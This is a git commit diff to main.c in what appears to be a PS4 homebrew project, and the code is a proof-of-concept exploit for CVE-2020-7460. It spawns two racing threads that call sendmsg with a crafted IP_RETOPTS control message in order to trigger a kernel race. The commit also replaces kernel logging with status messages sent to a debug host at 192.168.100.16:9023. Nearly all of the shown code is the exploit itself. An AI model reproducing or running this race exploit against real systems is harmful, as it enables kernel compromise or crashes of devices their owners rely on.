587f90d543e6390b242821d612be989fa53f2883
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2026-03-10 05:07:03 +0100

    Update main.c

--- examples/ps4-history-blocker/source/main.c
+++ examples/ps4-history-blocker/source/main.c
@@ -1,4 +1,5 @@
-#include <ps4.h>
+#include "ps4.h"
+#include "Network.h"
 
 struct msghdr {
     void         *msg_name;
@@ -19,10 +20,13 @@ struct cmsghdr {
 #define IP_RETOPTS 7
 #define ITERATIONS 500000
 #define CONTROL_LEN 256
+#define DEBUG_IP "192.168.100.16"
+#define DEBUG_PORT 9023
 
 struct cmsghdr *cmsg;
 uint8_t control_buf[CONTROL_LEN];
 int global_sock;
+int debug_sock;
 
 void *sendmsg_thread(void *arg) {
     SceKernelCpuset cpuset;
@@ -57,44 +61,45 @@ void *race_thread(void *arg) {
 }
 
 int _main(struct thread *td) {
+    UNUSED(td);
     initKernel();
     initLibc();
     initNetwork();
 
-    klog("[+] Starting CVE-2020-7460 PoC\n");
+    debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
+    
+    if (debug_sock > 0) {
+        char msg[] = "[+] Connected! Starting CVE-2020-7460 PoC\n";
+        SckSend(debug_sock, msg, strlen(msg));
+    }
 
     global_sock = syscall(97, 2, 2, 0);
     if (global_sock < 0) {
-        klog("[-] Failed to create socket\n");
+        if (debug_sock > 0) {
+            char err[] = "[-] Failed to create socket\n";
+            SckSend(debug_sock, err, strlen(err));
+        }
         return -1;
     }
 
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
-    
-    if (!cmsg) {
-        klog("[-] Buffer error\n");
-        return -1;
-    }
-
     cmsg->cmsg_level = 0;
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
-    klog("[+] Launching race threads...\n");
-
     ScePthread thread1, thread2;
-    if (scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg") != 0) {
-        klog("[-] Thread 1 failed\n");
-    }
-    if (scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race") != 0) {
-        klog("[-] Thread 2 failed\n");
-    }
+    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
+    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
 
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
-    klog("[+] Race finished. If no panic, try again.\n");
+    if (debug_sock > 0) {
+        char done[] = "[+] Race finished. Check for Panic.\n";
+        SckSend(debug_sock, done, strlen(done));
+        SckClose(debug_sock);
+    }
 
     return 0;
 }
